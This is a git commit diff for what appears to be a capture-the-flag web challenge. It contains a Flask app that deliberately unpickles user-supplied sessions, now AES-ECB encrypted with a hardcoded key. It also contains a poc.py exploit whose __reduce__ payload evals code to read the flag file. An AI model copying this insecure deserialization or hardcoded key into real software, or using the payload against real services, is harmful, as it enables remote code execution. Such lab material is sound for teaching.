43e62993ace134ee4f7cf75a086a7a525c3ad155
Jay <lcm000522@gmail.com>
2024-08-02 16:41:11 +0900

    front fin

--- main/app.py
+++ main/app.py
@@ -2,44 +2,58 @@
 from flask import Flask, request, render_template, redirect
 import os, pickle, base64
 import logging
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
 
-logging.basicConfig(filename="./app.log", level=logging.DEBUG)
+logging.basicConfig(filename="./app.log", level=logging.DEBUG) #logging
 app = Flask(__name__)
-app.secret_key = os.urandom(32)
+app.secret_key = os.urandom(32) # AES key 생성
+AES_KEY = "36f6d9a966c4478c73af4fde2f813212"  # 256-bit key for AES
 
-try:
-    FLAG = open('./flag.txt', 'r').read() # Flag is here!!
-except:
-    FLAG = '[**FLAG**]'
+
+FLAG = open('./flag.txt', 'r').read() # Flag is "./flag.txt" !!
+
 
 INFO = ['name', 'userid', 'password']
+
+def encrypt(data):
+    cipher = AES.new(AES_KEY.encode(), AES.MODE_ECB)
+    return cipher.encrypt(pad(data, AES.block_size))
+
+def decrypt(data):
+    cipher = AES.new(AES_KEY.encode(), AES.MODE_ECB)
+    return unpad(cipher.decrypt(data), AES.block_size)
+
 
 @app.route('/')
 def index():
     return render_template('index.html')
 
-@app.route('/create_session', methods=['GET', 'POST']) # 직렬화
-def create_session():
+@app.route('/create_vsession', methods=['GET', 'POST']) # 직렬화
+def create_vsession():
     if request.method == 'GET':
-        return render_template('create_session.html')
+        return render_template('create_vsession.html')
     elif request.method == 'POST':
         info = {}
         for _ in INFO:
             info[_] = request.form.get(_, '')
-        data = base64.b64encode(pickle.dumps(info)).decode('utf8') # pickle.dumps한 것을 바이트 타입에서 문자열로 변환
-        return render_template('create_session.html', data=data)
+        try:
+            data = base64.b64encode(encrypt(pickle.dumps(info))).decode('utf8') # pickle.dumps한 것을 바이트 타입에서 문자열로 변환
+            return render_template('create_vsession.html', data=data)
+        except:
+            return "wrong!"
     else:
         return "wrong"
 
-@app.route('/check_session', methods=['GET', 'POST']) # 역직렬화
-def check_session():
+@app.route('/check_vsession', methods=['GET', 'POST']) # 역직렬화
+def check_vsession():
     if request.method == 'GET':
-        return render_template('check_session.html')
+        return render_template('check_vsession.html')
     elif request.method == 'POST':
-        session = request.form.get('session', '')
-        info = pickle.loads(base64.b64decode(session)) # 문자열을 바이트로 디코딩하고 이걸 역직렬화하여 원래 데이터로 변환.(이때 취약점 발생)
+        vsession = request.form.get('session', '')
+        info = pickle.loads(decrypt(base64.b64decode(vsession))) # 문자열을 바이트로 디코딩하고 이걸 역직렬화하여 원래 데이터로 변환.(이때 취약점 발생)
         logging.debug(f"아이피 {request.remote_addr}가 check_session을 시도함. {info}")
-        return render_template('check_session.html', info=info)
+        return render_template('check_vsession.html', info=info)
     else:
         return "wrong"
 
--- poc.py
+++ poc.py
@@ -1,12 +1,19 @@
 import pickle, base64
-# gAN9cQAoWAQAAABuYW1lcQFYBQAAAGd1ZXN0cQJYBgAAAHVzZXJpZHEDWAUAAABndWVzdHEEWAgAAABwYXNzd29yZHEFWAUAAABndWVzdHEGdS4=
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+# e43t4TxobdsqffJGA3rtQPKxhEET2V1SUtD7NsR5ebauC+IHhnDkbohTzM/ub5jd8QgXe4g7zcW7/pnhxGauY1lWkNaiH24GsLAPoaHGwxfJaA3C4wi00vUbg5pyAwO3+zzAVOKl/74GEifUqgDPbTkF6X8SsWfsl/vm3WvPjs0=
+s
+# AES -> serialize -> base64
+def encrypt(data): #AES
+    cipher = AES.new("36f6d9a966c4478c73af4fde2f813212".encode(), AES.MODE_ECB)
+    return cipher.encrypt(pad(data, AES.block_size))
 
-class Webcome:
-    def __reduce__(self): #__reduce__(클래스에 대한 내장 함수)
+class WebcomeExploit: # class 생성
+    def __reduce__(self):
         cmd = "open('./flag.txt', 'r').read()"
         return (__builtins__.eval, (cmd,))
 
 
-data = {'name': Webcome(), 'userid': 'idid', 'password': 'passpass'}
-payload = base64.b64encode(pickle.dumps(data)).decode('utf8')
+data = {'name': WebcomeExploit(), 'userid': 'modori205', 'password': '123456'}
+payload = base64.b64encode(encrypt(pickle.dumps(data))).decode('utf8') # 직렬화 + base64
 print(payload)
